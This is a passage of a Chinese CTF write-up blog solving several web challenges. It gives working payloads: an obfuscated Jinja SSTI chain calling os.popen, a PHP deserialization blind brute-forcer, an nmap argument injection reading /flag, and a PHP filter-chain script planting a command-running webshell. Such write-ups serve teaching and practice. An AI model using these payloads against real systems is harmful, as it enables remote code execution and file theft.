clazz=(xhx,xhx,claz,xhx,xhx)|join%&#125;					#__class__</span><br><span class="line">&#123;% set baz = dict(ba=aa,se=b)|join %&#125;						#base</span><br><span class="line">&#123;%set bazz=(xhx,xhx,baz,xhx,xhx)|join%&#125;						#__base__</span><br><span class="line">&#123;% set subz = dict(subc=aa,lasses=b)|join %&#125;				#subclasses</span><br><span class="line">&#123;%set subzz=(xhx,xhx,subz,xhx,xhx)|join%&#125;					#__subclasses__</span><br><span class="line">&#123;% set getz= dict(geti=aa,tem=b)|join %&#125;					#getitem</span><br><span class="line">&#123;%set getzz=(xhx,xhx,getz,xhx,xhx)|join%&#125;					#__getitem__</span><br><span class="line">&#123;% set inz= dict(in=aa,it=b)|join %&#125;						#init</span><br><span class="line">&#123;%set inzz=(xhx,xhx,inz,xhx,xhx)|join%&#125;						#__init__</span><br><span class="line">&#123;% set glo= dict(glo=aa,bals=b)|join %&#125;						#globals</span><br><span class="line">&#123;%set glob=(xhx,xhx,glo,xhx,xhx)|join%&#125;						#__globals__</span><br><span class="line">&#123;% set xi=()|attr(clazz)|attr(bazz)|attr(subzz)()|attr(getzz)(279)|attr(inzz)|attr(glob)|string|attr(getzz)(69) %&#125;       #/        //从另一个表里拿到斜杠</span><br><span class="line">&#123;% set oz= dict(o=aa,s=b)|join %&#125;							#os</span><br><span class="line">&#123;% set pom= dict(po=aa,pen=b)|join %&#125;						#popen</span><br><span class="line">&#123;% set re= dict(re=aa,ad=b)|join %&#125;							#read</span><br><span class="line">&#123;% set ca= dict(c=aa,at=b)|join %&#125;							#cat</span><br><span class="line">&#123;% set f= dict(fl4gf=aa,l4gfl4g=b)|join %&#125;					#fl4gfl4gfl4g</span><br><span class="line">&#123;% set payload=(ca,kong,point,point,xi,point,point,xi,f)|join%&#125;</span><br><span class="line">#cat ../../fl4gfl4gfl4g</span><br><span class="line">&#123;&#125;()|attr(clazz)|attr(bazz)|attr(subzz)()|attr(getzz)(279)|attr(inzz)|attr(glob)|attr(getzz)(oz)|attr(pom)(payload)|attr(re)()&#125;&#125;</span><br><span class="line">#().__class__.__base__.__subclasses__.__getitem__(279).__init__.__globals__.__getitem__(oz).popen(cat ../../fl4gfl4gfl4g).read()</span><br></pre></td></tr></table></figure>

<p>__getitem__(279)为[279]</p>
<p>SYC{YARCu1gP5RLkoNNwcI}</p>
<h2 id="Akane"><a href="#Akane" class="headerlink" title="Akane!"></a>Akane!</h2><p>这道题要我们猜测flag所在文件的名字，根据不同的回显，相当于盲注。</p>
<p>我们要一步一步猜测文件名，所以要绕过wakeup</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$b = str_replace(&quot;Hoshino\&quot;:1&quot;,&quot;Hoshino\&quot;:2&quot;,$b);</span><br></pre></td></tr></table></figure>

<p>调用call方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;Ruby-&gt;func(); </span><br></pre></td></tr></table></figure>

<p>php这边简单，看代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hoshino</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Ruby</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Idol</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Akane</span>=<span class="string">&#x27;glob:///var/www/html/The*.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$q</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Akane=<span class="variable">$q</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Hoshino</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;Ruby= <span class="keyword">new</span> <span class="title class_">Idol</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;Hoshino\&quot;:1&quot;</span>,<span class="string">&quot;Hoshino\&quot;:2&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>

<p>这里让Akane的值为$argv[1]的值，可以通过外部终端传入，配合python脚本使用，</p>
<p>python脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;https://j8mh5c6z3h7vvi33edzdfdmqa.node.game.sycsec.com/?tuizi=&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;glob:///var/www/html/The&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">dic = string.ascii_letters+string.digits+<span class="string">&#x27;_-+.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        file=filename+flag+i+<span class="string">&#x27;*.php&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(file)</span><br><span class="line">        read = os.popen(<span class="string">&#x27;php /home/yinyun/Documents/php文件/test.php &#x27;</span>+file).read()</span><br><span class="line">        res = requests.get(url=url+read)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Kurokawa Akane&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag+=i</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>爆出名字为：TheS4crEtF1AgFi1EByo2takuXX.php</p>
<p>SYC{qabhfOQdYBX0MYrA8q}</p>
<h2 id="scan-tool"><a href="#scan-tool" class="headerlink" title="scan_tool"></a>scan_tool</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/110893526">https://blog.csdn.net/weixin_44037296/article/details/110893526</a></p>
<p><strong>考点</strong>：<code>nmap -oG 写入文件</code>、<code>-iL读取扫描文件</code>、<code>escapeshellarg</code>绕过</p>
<p>PHP中的<code>escapeshellarg()</code>函数会剔除不可见字符,这个特性可以用来绕过对<code>-iL</code>、<code>-oN</code>等参数的过滤。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=&#x27; -i%faL /flag -o%faN 1.txt &#x27;</span><br></pre></td></tr></table></figure>

<p>然后看1.txt即可拿到flag</p>
<p>SYC{jvphuvHv43WbXRMoan}</p>
<h2 id="ezrfi"><a href="#ezrfi" class="headerlink" title="ezrfi"></a>ezrfi</h2><p>hint为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w5YubyBvd08gMHcwIG92MCDDlndvIE8ubyAwLjAgMC5vIMOWdjAgMHbDliBPdjAgT3fDliBvLk8gw5Z2TyAwXzAgMF9PIG8uTyAwdjAgw5ZfbyBPd28gw5Z2TyDDli5PIMOWXzAgTy5PIMOWXzAgMHbDliAwLjAgw5Z2w5Ygw5Z3MCBPdsOWIMOWdjAgT1/DliDDlnZPIMOWLk8gw5Z3MCBvd8OWIMOWLm8gTy5vIMOWXzAgMHbDliDDlndvIE93w5YgTy5vIE93TyBvX28gw5YuTyBvLm8gb3dPIMOWXzAgb3dPIMOWXzAgMHZvIG8uTyBPd8OWIE92byAwLsOWIMOWdjAgTy7DliAwLjAgMHfDliBvLsOWIG93byBvdzAgMHZvIMOWLm8gb3dPIG9fMCDDli5PIG9fbyBPd8OWIE8ubyBvdzAgw5ZfbyBvd28gw5YuMCDDlnZPIG9fTyBPLsOWIE92MCBPdzAgby7DliAwdjAgT3YwIE9fTyBvLk8gT3bDliDDlnYwIMOWXzAgw5Z3byBvd08gT19vIE93w5Ygby5PIMOWdk8gby4wIDBfMCDDll9vIG93TyBPXzAgMC7DliDDli5vIE8uTyBPdzAgT19vIMOWdjAgb3cwIMOWdjAgT18wIMOWdm8gw5Z2w5Ygw5ZfbyAwX8OWIMOWdm8gw5Z2w5YgMHcwIE92w5Ygw5YubyDDli4wIMOWLm8gb3ZvIMOWLjAgw5YuMCAwd28gb3dPIG8uTyAwd8OWIDB2MCBvd8OWIMOWdzAgw5YubyAwdzAgT1/DliBvX08gw5Z2byAg</span><br></pre></td></tr></table></figure>

<p>base64解码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ö.o owO 0w0 ov0 Öwo O.o 0.0 0.o Öv0 0vÖ Ov0 OwÖ o.O ÖvO 0_0 0_O o.O 0v0 Ö_o Owo ÖvO Ö.O Ö_0 O.O Ö_0 0vÖ 0.0 ÖvÖ Öw0 OvÖ Öv0 O_Ö ÖvO Ö.O Öw0 owÖ Ö.o O.o Ö_0 0vÖ Öwo OwÖ O.o OwO o_o Ö.O o.o owO Ö_0 owO Ö_0 0vo o.O OwÖ Ovo 0.Ö Öv0 O.Ö 0.0 0wÖ o.Ö owo ow0 0vo Ö.o owO o_0 Ö.O o_o OwÖ O.o ow0 Ö_o owo Ö.0 ÖvO o_O O.Ö Ov0 Ow0 o.Ö 0v0 Ov0 O_O o.O OvÖ Öv0 Ö_0 Öwo owO O_o OwÖ o.O ÖvO o.0 0_0 Ö_o owO O_0 0.Ö Ö.o O.O Ow0 O_o Öv0 ow0 Öv0 O_0 Övo ÖvÖ Ö_o 0_Ö Övo ÖvÖ 0w0 OvÖ Ö.o Ö.0 Ö.o ovo Ö.0 Ö.0 0wo owO o.O 0wÖ 0v0 owÖ Öw0 Ö.o 0w0 O_Ö o_O Övo  </span><br></pre></td></tr></table></figure>

<p>尊嘟假嘟解密：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shy0JhFpsi+njV0IfFfzS44KIcwPFg312qo6gfdk0+DzcoMdSgVs15cERxpqnPJh4Y3b3i/mcbkPlHGTIA6/A8CQU8UX6j9w5HKy</span><br></pre></td></tr></table></figure>

<p>rc4解密：密钥靠猜：Syclover</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件包含逻辑是include($file.&quot;.py&quot;),你能找到flag文件位置吗??</span><br></pre></td></tr></table></figure>

<p>后缀给死了，我们可以利用<code>php filter chain</code>突破后缀”限制”。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://o8psad59go93x7xvicykjqu7c.node.game.sycsec.com/index.php&quot;</span></span><br><span class="line"><span class="comment">#可以读取到的文件</span></span><br><span class="line">file_to_use = <span class="string">&quot;/var/hint&quot;</span></span><br><span class="line"><span class="comment">#要执行的命令</span></span><br><span class="line">command = <span class="string">&quot;cat /ffffffllllag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#两个分号避开了最终 base64 编码中的斜杠</span></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>SYC{The PhpFFffilter 0n File-include vulnerabilities is s0 Amazing!!#@##&#125;</p>
	
		</div>
		
		<div id="current-post-cover" data-scr="https://pic1.zhimg.com/v2-0dda71bc9ced142bf7bb2d6adbebe4f0_r.jpg"></div>

		<!-- relate post, comment...-->
		<div class="investment-container">
			<div class="investment-header">
				<div class="investment-title-1">
					<div class="on">相关文章</div>
					<div>评论</div>
					<div>分享</div>
				</div>
				<div class="investment-title-2">	            
					
	<span>
		<a id="totop-post-page">返回顶部</a>
		
			<a href="/2024/01/31/Hgame%202024%20week%201/" title="Hgame 2024 week 1" rel="prev">
				&laquo;上一篇
			</a>
		
			
	</span>


      		
				</div>	
			</div>
			
			<div class="investment-content">
				<div class="investment-content-list">
					

<div class="relate-post">
	
		<ul>
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" title="NepCTF2024部分web">
								NepCTF2024部分web			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								八月 25日, 2024				
							</p>
							<p class="relate-post-content">
								NepDouble代码过长这里不贴了，看到上传压缩包的第一反应是做一个链接到&#x2F;flag的软连接，上传上去解压就可以看到flag了，但是这里
12if os.path.islink(new_file):    return &...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" title="NepCTF2024部分web">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/nepctf2024/nepctf2024.png" alt="NepCTF2024部分web"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" title="2024第七届巅峰极客部分wp">
								2024第七届巅峰极客部分wp			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								八月 25日, 2024				
							</p>
							<p class="relate-post-content">
								GoldenHornKing源码给了是很明显的ssti，在&#x2F;calc路由里传参calc_req，黑名单是不能有：数字、百分号、非ascii之外的字符。最烦的是这个access，原本是False，可以不用管，但是一旦成功执行一...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" title="2024第七届巅峰极客部分wp">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/dfjk/dfjk.png" alt="2024第七届巅峰极客部分wp"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/" title="2024春秋杯部分wp">
								2024春秋杯部分wp			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								七月 6日, 2024				
							</p>
							<p class="relate-post-content">
								brother打开题目是?name&#x3D;hello，还回显了hello，看一下后台语言和框架

一眼ssti模版注入，
1?name=&#123;&#123;g.pop.__globals__.__builtins__.__im...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/" title="2024春秋杯部分wp">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/2024春秋杯/2024春秋杯.png" alt="2024春秋杯部分wp"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛wp">
								PolarCTF2024夏季个人挑战赛wp			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								六月 10日, 2024				
							</p>
							<p class="relate-post-content">
								扫扫看不用扫，猜测是flag.php


flag{094c9cc14068a7d18ccd0dd3606e532f}

debudaoflag在cookie里：


flag{72077a55w312584wb1aaa88888cd...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛wp">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/PolarCTF2024春季个人挑战赛wp/polarctf.png" alt="PolarCTF2024夏季个人挑战赛wp"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024春季个人挑战赛wp">
								PolarCTF2024春季个人挑战赛wp			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								四月 30日, 2024				
							</p>
							<p class="relate-post-content">
								机器人打开页面：

一眼robots.txt
123User-agent: *Disallow: /27f5e15b6af3223f1176293cd015771dFlag: flag&#123;4749ea1ea481a5d

只有...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024春季个人挑战赛wp">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/PolarCTF2024春季个人挑战赛wp/polarctf.png" alt="PolarCTF2024春季个人挑战赛wp"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2024/04/26/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/" title="第九届中国海洋大学信息安全竞赛web题解">
								第九届中国海洋大学信息安全竞赛web题解			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								四月 26日, 2024				
							</p>
							<p class="relate-post-content">
								ezPHPparse_str()可以进行变量覆盖。
全部流量包：

菜狗工具#1python继承链攻击。
1print(().__class__.__base__.__subclasses__()[132].__init__.__gl...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2024/04/26/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/" title="第九届中国海洋大学信息安全竞赛web题解">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/第九届中国海洋大学信息安全竞赛web题解/blue-whale_logo.png" alt="第九届中国海洋大学信息安全竞赛web题解"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2024/04/20/DASCTF2024%E6%A0%A1%E8%B5%9B/" title="DASCTF2024校赛">
								DASCTF2024校赛			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								四月 20日, 2024				
							</p>
							<p class="relate-post-content">
								cool_indexserver.js:
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2024/04/20/DASCTF2024%E6%A0%A1%E8%B5%9B/" title="DASCTF2024校赛">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/DASCTF2024校赛/2024dasctf.png" alt="DASCTF2024校赛"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2024/04/09/XYCTF2024/" title="XYCTF2024">
								XYCTF2024			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								四月 9日, 2024				
							</p>
							<p class="relate-post-content">
								ezhttp打开是登录页面，先看源码，源码提示：
1&lt;!-- 为了防止忘记密码，我把它们放在某个地方了 --&gt;

第一反应是robots.txt，进去看看。

得到&#x2F;l0g1n.txt，进入得到帐号密码：
12u...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2024/04/09/XYCTF2024/" title="XYCTF2024">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="XYCTF2024"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2024/03/25/NKCTF2024/" title="NKCTF2024">
								NKCTF2024			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								三月 25日, 2024				
							</p>
							<p class="relate-post-content">
